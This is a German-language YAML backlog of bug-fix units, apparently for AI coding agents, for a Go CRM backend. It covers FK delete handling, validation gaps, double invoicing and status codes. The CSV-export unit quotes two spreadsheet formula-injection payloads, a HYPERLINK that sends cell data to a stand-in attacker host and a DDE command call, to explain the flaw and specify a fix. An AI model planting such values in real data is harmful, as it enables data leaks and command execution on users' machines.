  - id: fix-contact-delete-merged-into-no-action-unchecked
    phase: 3
    service: crm
    model: sonnet
    deps: []
    status: todo
    coverage_start: "internal/crm/contact 80,4 % (CI-Stand 1b49a1f3, Run 32508843776)"
    scope: >
      Beim Bauen von `feat-contact-deletion-cascade-impact-preview` (Lauf 10) kam eine neunte
      FK-Referenz auf `contacts(id)` zum Vorschein, die im Kaskaden-Befund des Laufkopfes fehlt:
      `contacts.merged_into_id` (gesetzt von `MergeInto`, wenn ein Kontakt in einen anderen
      gemergt wird) traegt `ON DELETE NO ACTION` — weder CASCADE noch SET NULL noch das
      gepruefte RESTRICT. `Service.IsInUse`
      (`internal/crm/contact/postgres_repository.go`, Methode `IsInUse`) prueft ausschliesslich
      `advisory_protocols` und `dialer_campaign_contacts`. Wird ein Kontakt geloescht, der als
      Primary-Kontakt eines abgeschlossenen Merges dient (eine andere Zeile in `contacts` hat
      `merged_into_id` = seine ID), lehnt `IsInUse` nichts ab — der DELETE laeuft durch bis zur
      Datenbank und schlaegt dort mit einer unbehandelten FK-Verletzung fehl (500 statt sauberem
      409 mit Anonymisierungsangebot, wie es die anderen RESTRICT-Faelle bekommen).
      Live an der lokalen DB nachgewiesen (2026-08-22, `kmuhub_app`):
      ```
      SELECT rel.relname, att.attname, con.confdeltype::text
      FROM pg_constraint con
      JOIN pg_class rel ON rel.oid = con.conrelid
      JOIN pg_attribute att ON att.attrelid = con.conrelid AND att.attnum = con.conkey[1]
      WHERE con.contype = 'f' AND con.confrelid = 'public.contacts'::regclass;
      ```
      liefert u.a. `contacts | merged_into_id | a` (confdeltype 'a' = NO ACTION), waehrend
      `contacts | referred_by_contact_id | n` (SET NULL) bereits harmlos ist.
    sources:
      - backend/internal/crm/contact/postgres_repository.go
      - backend/internal/crm/contact/service.go
      - backend/migrations/000059_add_duplicate_detection.up.sql
    notes: >
      Zwei mögliche Root-Cause-Fixes, beide legitim — diese Unit muss sich entscheiden, nicht
      beide nebeneinander bauen:
      (a) Migration: `merged_into_id`-Constraint auf `ON DELETE SET NULL` umstellen (DROP
      CONSTRAINT + neu anlegen mit derselben Definition wie `referred_by_contact_id`). Loescht
      man den Primary-Kontakt eines Merges, ist das Verschwinden der Merge-Historie fuer diese
      eine Zeile hinnehmbar — der Duplicate-Kontakt selbst existiert (soft-deleted) weiter.
      (b) `IsInUse` um eine dritte EXISTS-Klausel auf
      `SELECT 1 FROM contacts WHERE merged_into_id = $1 AND tenant_id = $2` erweitern, damit der
      bestehende 409-Pfad greift statt eines rohen DB-Fehlers.
      (a) ist die staerkere Loesung (kein Sonderfall im Anwendungscode mehr, konsistent mit der
      zweiten Selbstreferenz), erfordert aber eine Migration mit Forward-only-Charakter — pruefen,
      ob eine bestehende Merge-Historie in Produktion ueberhaupt von diesem Constraint abhaengt
      (does any code path read merged_into_id expecting it to survive a primary's deletion?),
      bevor entschieden wird. Diese Unit soll die Entscheidung treffen und begruenden, nicht nur
      eine der beiden Optionen blind bauen.
    done_when:
      - Root Cause entschieden und begruendet (Migration ODER IsInUse-Erweiterung), nicht beides
      - Ein Test reproduziert den bisherigen Fehlzustand (500/unbehandelter FK-Fehler beim
        Loeschen eines gemergten Primary-Kontakts) und zeigt danach das saubere 409-Verhalten
      - go test -count=1 ./internal/crm/contact/... gruen, DATABASE_URL gesetzt
      - Falls Migration: rls-smoke/Migrationslauf (up und down) dokumentiert

  - id: fix-recurring-invoice-clear-end-date
    phase: 4
    service: gateway
    model: sonnet
    deps: []
    status: todo
    coverage_start: "n.a. — Bugfix, kein Coverage-Ziel"
    scope: >
      `HandleUpdateRecurringInvoice` (route_biz_recurring.go:139) liest ein leeres
      `end_date`-Feld als Sentinel dafuer, dass der Client das Enddatum eines Abo-Rechnungs-
      Zeitplans ausdruecklich loeschen will (`grpcReq.ClearEndDate = true`, Zeile 179 ff.). Dieser
      Zweig ist ueber HTTP nicht erreichbar: `decodeAndValidate` prueft das
      `validate:"omitempty,datetime=2006-01-02"`-Tag auf `EndDate *string`, BEVOR der Handler
      seine eigene Sentinel-Logik sieht. go-playground/validator behandelt `omitempty` bei einem
      Pointer-Feld so, dass nur ein NIL-Pointer uebersprungen wird — ein Pointer, der auf einen
      leeren String zeigt, gilt als vorhanden und wird gegen `datetime` geprueft, wo ein leerer
      String durchfaellt. Ein Client, der `{"end_date": ""}` sendet, bekommt also 400
      ("end_date: failed datetime") statt der beabsichtigten Loeschung des Enddatums — die
      Funktion "Enddatum entfernen" ist damit fuer jeden echten API-Aufruf toter Code.
      Verifiziert am 2026-08-22 waehrend `cov-gateway-biz-recurring-invoices` (Iteration 18):
      `TestHandleUpdateRecurringInvoice_EmptyEndDateRejectedByValidationBeforeClearLogicRuns` in
      `route_biz_recurring_test.go` belegt den 400 empirisch. Diese Coverage-Unit durfte laut
      Auftrag kein Verhalten aendern, deshalb ist der Fund hier als eigene Unit angelegt statt
      nebenbei gefixt.
    sources:
      - backend/internal/gateway/route_biz_recurring.go
      - backend/internal/gateway/route_biz_recurring_test.go
      - backend/internal/biz/recurring/service.go
    notes: >
      Root Cause statt Symptom: nicht die `datetime`-Regel um `omitempty` fuer den Leerstring-Fall
      herumbauen (z. B. eine benutzerdefinierte Validierungsfunktion), sondern zuerst pruefen, ob
      derselbe Pointer-vs-omitempty-Fall noch in anderen `update*Request`-Structs mit einem
      "Enddatum loeschen"-Sentinel vorkommt (Kandidat: andere `Clear*`-Felder im `biz`-Paket) —
      findet sich das Muster ein zweites Mal, gehoert der Fix in eine gemeinsame Loesung, nicht
      zweimal einzeln.
      Zwei legitime Fixrichtungen, eine davon waehlen und begruenden:
      (a) Ein zweites JSON-Feld einfuehren (z. B. `clear_end_date: true`), das die
      Enddatum-Loeschung eindeutig macht und `EndDate` nur noch fuer echte Datumswerte validiert.
      (b) Die Validierung des `EndDate`-Felds so anpassen, dass ein leerer String explizit als
      "loeschen" durchgelassen wird (z. B. eigene Validierungsfunktion statt des generischen
      `datetime`-Tags, die einen leeren String zulaesst und alles andere gegen das Format prueft).
      Das Frontend, das dieses Feld heute setzt, gehoert vor der Entscheidung gegengeprueft — ob
      es ueberhaupt einen Weg anbietet, das Enddatum zu leeren, und in welcher Form.
    done_when:
      - Root Cause entschieden und begruendet (neues Feld ODER angepasste Validierung), nicht
        eine Notloesung um das Symptom herum
      - Ein Test sendet den bisherigen "leeres end_date"-Request und belegt jetzt die
        tatsaechliche Loeschung des Enddatums (nicht mehr 400)
      - Der bisherige Regressionstest fuer den 400-Fehlzustand
        (`TestHandleUpdateRecurringInvoice_EmptyEndDateRejectedByValidationBeforeClearLogicRuns`)
        wird durch den neuen Test ersetzt bzw. umgedreht, nicht daneben stehen gelassen
      - go test -count=1 ./internal/gateway/ ./internal/biz/recurring/... gruen,
        DATABASE_URL gesetzt

  - id: fix-biz-time-entry-invoice-double-billing
    phase: 4
    service: biz
    model: sonnet
    deps: []
    status: todo
    coverage_start: "n.a. — Bugfix, kein Coverage-Ziel"
    scope: >
      `HandleCreateInvoiceFromTime` (route_biz_ext.go:51) erzeugt ueber
      `BizGRPCServer.CreateInvoiceFromTimeEntries` (biz_grpc.go:1981) eine Rechnung aus
      aggregierter Arbeitszeit. Die Aggregation
      (`PostgresWorkTimeRepo.AggregateWorkTimeForInvoice`, postgres_repository.go:532) filtert
      NUR auf Tenant, Mitarbeiter, Status und das `clock_in`-Zeitfenster — sie prueft nicht, ob
      einer der gefundenen `hr_work_time_entries`-Eintraege bereits in einer frueheren Rechnung
      abgerechnet wurde. `LinkTimeTracking` (biz_grpc.go:2101) schreibt den
      `time_tracking_source` nur als Audit-Trail auf die neu erzeugte Rechnung — er wird
      nirgends zurueckgelesen, um bereits abgerechnete Eintraege beim naechsten Aufruf
      auszuschliessen. Ruft ein Nutzer denselben Endpunkt zweimal mit identischem
      Mitarbeiter/Zeitraum auf (Doppelklick, Retry nach Timeout, zwei Sachbearbeiter parallel),
      entstehen zwei vollstaendig getrennte Rechnungen ueber dieselben Stunden.
      Verifiziert am 2026-08-22 waehrend `cov-gateway-biz-ext-time-billing` (Iteration 21):
      `hr_work_time_entries` (migrations/000046_create_hr_tables.up.sql:120) hat ueberhaupt
      keine `billed`/`invoice_id`-Spalte — anders als `internal/work/timeentry`, das fuer eine
      voellig andere Tabelle ein `billed`-Flag fuehrt (route_biz_time_entries.go). Diese
      Coverage-Unit durfte laut Auftrag kein Verhalten aendern, deshalb ist der Fund hier als
      eigene Unit angelegt statt nebenbei gefixt.
    sources:
      - backend/internal/server/biz_grpc.go
      - backend/internal/biz/hr/timetracking/postgres_repository.go
      - backend/internal/biz/hr/timetracking/repository.go
      - backend/migrations/000046_create_hr_tables.up.sql
      - backend/internal/gateway/route_biz_ext.go
    notes: >
      Root Cause statt Symptom: die Sperre gehoert an die Aggregationsquelle
      (`AggregateWorkTimeForInvoice`), nicht als nachtraeglicher Guard im Gateway oder im
      RPC-Handler — jeder kuenftige Aufrufer der Repository-Methode muss denselben Schutz
      bekommen, nicht nur dieser eine Endpunkt.
      Zwei legitime Fixrichtungen, eine davon waehlen und begruenden:
      (a) Neue Spalten `billed_at`/`invoice_id` auf `hr_work_time_entries` (Migration + Index),
      von `AggregateWorkTimeForInvoice` per `AND billed_at IS NULL` ausgeschlossen und von
      `CreateInvoiceFromTimeEntries` nach erfolgreichem `invoiceService.Create` in derselben
      Transaktion gesetzt (sonst Race zwischen Aggregation und Markierung).
      (b) `entry_ids` aus jeder vorherigen Rechnung in einer eigenen Zuordnungstabelle
      festhalten (statt nur im JSON-Audit-Trail) und die Aggregation dagegen per NOT EXISTS
      filtern.
      (a) ist die einfachere und direkt am Symptom liegende Loesung, hat aber Implikationen fuer
      jeden Bericht, der `hr_work_time_entries` heute ungefiltert liest — vor der Entscheidung
      pruefen, ob ein solcher Bericht existiert und die neue Spalte dort mitgedacht werden muss.
      Zwei parallele Aufrufe fuer denselben Zeitraum sind der Kernfall — ein Test mit zwei
      direkt aufeinanderfolgenden Aufrufen muss beim zweiten entweder 0 Stunden aggregieren
      (FailedPrecondition "no completed work time entries found") oder eine explizite
      Konflikt-Antwort liefern, nicht stillschweigend eine zweite Rechnung erzeugen.
    done_when:
      - Root Cause entschieden und begruendet (Spalte ODER Zuordnungstabelle), nicht eine
        Notloesung, die nur diesen einen Aufrufer schuetzt
      - Ein Test ruft `CreateInvoiceFromTimeEntries` zweimal mit identischem Mitarbeiter/Zeitraum
        auf und belegt, dass der zweite Aufruf KEINE zweite Rechnung ueber dieselben Stunden
        erzeugt
      - Markierung als abgerechnet und Rechnungserstellung sind atomar (kein Fenster, in dem ein
        dritter, gleichzeitiger Aufruf dieselben Eintraege noch sieht)
      - go test -count=1 ./internal/server/... ./internal/biz/hr/timetracking/... gruen,
        DATABASE_URL gesetzt
      - migration ok (up und down lokal gefahren), falls Option (a) gewaehlt

  - id: fix-gateway-email-service-unavailable-status-code
    phase: 4
    service: gateway
    model: sonnet
    deps: []
    status: todo
    coverage_start: "n.a. — Bugfix, kein Coverage-Ziel"
    scope: >
      Gefunden 2026-08-22 waehrend `cov-gateway-email-messages-folders-sync` (Iteration 25).
      Jeder andere Route-File im Gateway meldet "Service nicht erreichbar" ueber den
      gemeinsamen Helper `respondServiceUnavailable` (helpers.go:83), der einheitlich 503
      liefert — sowohl wenn der Service gar nicht in der Registry steht als auch wenn die
      Registrierung existiert, die Verbindung aber fehlschlaegt. `route_email.go` allein weicht
      davon ab: alle 58 Vorkommen des Client-Fetch-Fehlerpfads schreiben stattdessen von Hand
      `response.Error(w, http.StatusBadGateway, "email service unavailable")` (502). Innerhalb
      dieser einen Datei ist das konsistent, aber inkonsistent mit dem Rest des Gateways UND in
      sich selbst zweideutig: "Service nicht registriert" liefert 502, "Service registriert,
      aber RPC schlaegt mit codes.Unavailable fehl" liefert ueber `respondGRPCError` 503 — zwei
      Codes fuer dieselbe Bedeutung ("Email-Backend gerade nicht da"), abhaengig vom internen
      Registrierungszustand, den ein Client nicht kennt und nicht kennen sollte.
    sources:
      - backend/internal/gateway/route_email.go
      - backend/internal/gateway/helpers.go
    notes: >
      Root Cause statt Symptom: alle 58 Vorkommen des Musters
      `response.Error(w, http.StatusBadGateway, "email service unavailable")` durch
      `respondServiceUnavailable(w, e.ServiceName())` ersetzen (ServiceName() liefert "email",
      route_email.go:121) — nicht einzelne Stellen von Hand pflegen. Ein Grep auf
      `StatusBadGateway` in route_email.go muss danach 0 Treffer liefern.
      Frontend-Auswirkung vor dem Fix pruefen: falls das Frontend 502 vs. 503 unterschiedlich
      behandelt (z. B. 502 als "dauerhaft kaputt", 503 als "gleich nochmal versuchen"), gehoert
      das in die Unit-Notizen, nicht stillschweigend geaendert.
      Alle bestehenden Tests in route_email_accounts_test.go, route_email_compose_test.go und
      route_email_folders_messages_sync_test.go, die 502 erwarten (Suchbegriff
      `StatusBadGateway` bzw. `testEmailServiceUnavailable`), muessen im selben Commit auf 503
      umgestellt werden — sonst faellt das Gate sofort rot.
    done_when:
      - route_email.go verwendet ausschliesslich respondServiceUnavailable statt eines
        hartkodierten StatusBadGateway fuer den Client-Fetch-Fehlerpfad
      - Alle betroffenen Tests erwarten jetzt 503 statt 502; testEmailServiceUnavailable
        entfaellt zugunsten von testServiceUnavailable (oder wird entsprechend angepasst)
      - go test -count=1 ./internal/gateway/ gruen, TestOpenAPIRouteDrift unveraendert gruen
      - Frontend-Verhalten bei 502 vs. 503 im Journal dokumentiert (unveraendert lassen oder
        Grund fuer die Aenderung nennen)

  - id: fix-email-contacts-csv-export-formula-injection
    phase: 4
    service: email
    model: sonnet
    deps: []
    status: todo
    coverage_start: "n.a. (Sicherheits-Fix, kein Coverage-Ziel)"
    scope: >
      `internal/email/contact/export_service.go` (`ExportService.ExportCSV`, Zeile 86-131)
      schreibt first_name/last_name/email/phone/company/position/notes unveraendert in
      CSV-Zellen. Beginnt einer dieser Werte mit `=`, `+`, `-` oder `@`, interpretiert Excel
      und LibreOffice die Zelle beim Oeffnen als Formel (CSV-Formel-Injection). Ein Kontakt
      mit Nachname `=HYPERLINK("http://evil.example/"&A1,"x")` oder Notizen
      `=cmd|'/C calc'!A0` fuehrt beim Anwender aus, der die Datei nur oeffnet — der Export
      ist damit ein Angriffsweg von Daten, die ueber die normale Kontaktpflege eingegeben
      wurden. Gefunden waehrend cov-gateway-email-contact-linking-import-export (Iteration 27,
      2026-08-22), als Coverage-Unit bewusst NICHT gefixt (Coverage-Units aendern kein
      Verhalten).
    sources:
      - backend/internal/email/contact/export_service.go
      - backend/internal/email/contact/export_service_test.go
    notes: >
      Root Cause statt Symptom: EINE Hilfsfunktion (z. B. `neutralizeFormulaCell(s string)
      string`), die jedem Feldwert direkt vor `row = append(row, ...)` vorgeschaltet wird —
      nicht sieben Einzelfaelle von Hand patchen. Wer die Funktion an einer Stelle vergisst,
      hat die Luecke nur verschoben.
      Uebliche Neutralisierung: beginnt der Wert mit `=`, `+`, `-` oder `@`, ein fuehrendes
      Apostroph (`'`) voranstellen (Excel behandelt die Zelle dann als Text) — NICHT den
      Wert abschneiden oder den Datensatz verwerfen, die Auskunfts-/Exportpflicht bleibt
      bestehen.
      `ExportVCard` (selbe Datei, Zeile 163-230) ist nicht betroffen: vCard-Felder werden nicht
      von Tabellenkalkulationen als Formeln interpretiert. Trotzdem gegenpruefen, nicht
      annehmen — falls ein vCard-Reader mit CSV-Import-Bruecke betroffen sein koennte, gehoert
      das in die Notes, nicht stillschweigend mit gefixt.
      Test MUSS das reale Angriffsmuster seeden (Feld beginnt mit `=`) und beweisen, dass die
      exportierte Zelle mit `'` beginnt oder sonst von keiner Tabellenkalkulation als Formel
      gelesen wird — nicht nur, dass irgendeine Zeichenkette ersetzt wurde.
    done_when:
      - Alle sieben CSV-Exportfelder neutralisieren `=`, `+`, `-`, `@` am Feldanfang ueber
        eine gemeinsame Funktion
      - Ein Test seedet einen Kontakt mit einem Formel-Praefix und belegt die Neutralisierung
      - Ein Test belegt, dass ein normaler Wert (kein Formel-Praefix) unveraendert bleibt

  - id: fix-gateway-advisory-product-riskclass-not-validated
    phase: 4
    service: gateway
    model: sonnet
    deps: []
    status: todo
    coverage_start: "n.a. (Validierungs-Fix, kein Coverage-Ziel)"
    scope: >
      `updateAdvisoryProtocolRequest.Products` (`backend/internal/gateway/route_crm_advisory.go`,
      Zeile 152) traegt `json:"products"` OHNE `dive` im `validate`-Tag. `advisoryProduct.RiskClass`
      hat zwar `validate:"min=1,max=7"`, aber go-playground/validator rekursiert nur dann in eine
      Slice von Structs, wenn das Slice-Feld selbst `dive` traegt (siehe
      `route_customization.go:473`: `validate:"required,min=1,dive"` als Referenzmuster). Ein
      Produkt mit `risk_class: 0` oder `risk_class: 99` erreicht deshalb ungeprueft die RPC statt
      mit 400 abgewiesen zu werden — belegt durch
      `TestHandleUpdateAdvisoryProtocol_ProductRiskClassNotValidated` in
      `route_crm_advisory_test.go` (Iteration 28, 2026-08-22), die den aktuellen (fehlerhaften)
      503-Pfad bewusst als Ist-Zustand pinnt statt eine 400-Erwartung zu erzwingen. Auch
      `internal/crm/advisoryprotocol/service.go` validiert nur `UpdateInput.RiskClass` (Zeile 178),
      nie die einzelnen `Product.RiskClass`-Werte — die Luecke ist also zweistufig: weder Gateway
      noch Service pruefen das Produkt-Feld.
    sources:
      - backend/internal/gateway/route_crm_advisory.go
      - backend/internal/gateway/route_crm_advisory_test.go
      - backend/internal/crm/advisoryprotocol/service.go
      - backend/internal/crm/advisoryprotocol/errors.go
    notes: >
      Zwei moegliche Fixstellen, nur eine waehlen: (a) `dive` auf das `Products`-Tag ergaenzen
      (Gateway-seitig, konsistent mit dem `route_customization.go`-Muster) — greift nur fuer den
      HTTP-Pfad; oder (b) `Service.Update`/`Service.Create` (advisoryprotocol/service.go) validiert
      jedes `Product.RiskClass` selbst, analog zu `ErrInvalidRiskClass` fuer das Protokoll-Level —
      greift fuer jeden Aufrufer der Service-Methode, nicht nur den Gateway-Pfad. (b) ist der Root
      Cause, (a) ist nur der HTTP-Rand; wenn beide gebaut werden, denselben Fehlertext/-code fuer
      beide Ebenen verwenden statt zwei Varianten der gleichen Meldung.
      Bestehenden Test `TestHandleUpdateAdvisoryProtocol_ProductRiskClassNotValidated` NICHT
      loeschen, sondern umdrehen: nach dem Fix muss er 400 mit Feld `products[0].risk_class` (oder
      dem tatsaechlichen Namespace-Format des Validators — pruefen, nicht raten) erwarten.
    done_when:
      - Ein Produkt mit risk_class ausserhalb 1-7 wird abgelehnt, bevor es Repository oder RPC
        erreicht
      - TestHandleUpdateAdvisoryProtocol_ProductRiskClassNotValidated erwartet nach dem Fix 400
        statt 503
      - go test -count=1 ./internal/gateway/ ./internal/crm/advisoryprotocol/... gruen
      - go test -count=1 ./internal/email/contact/... gruen

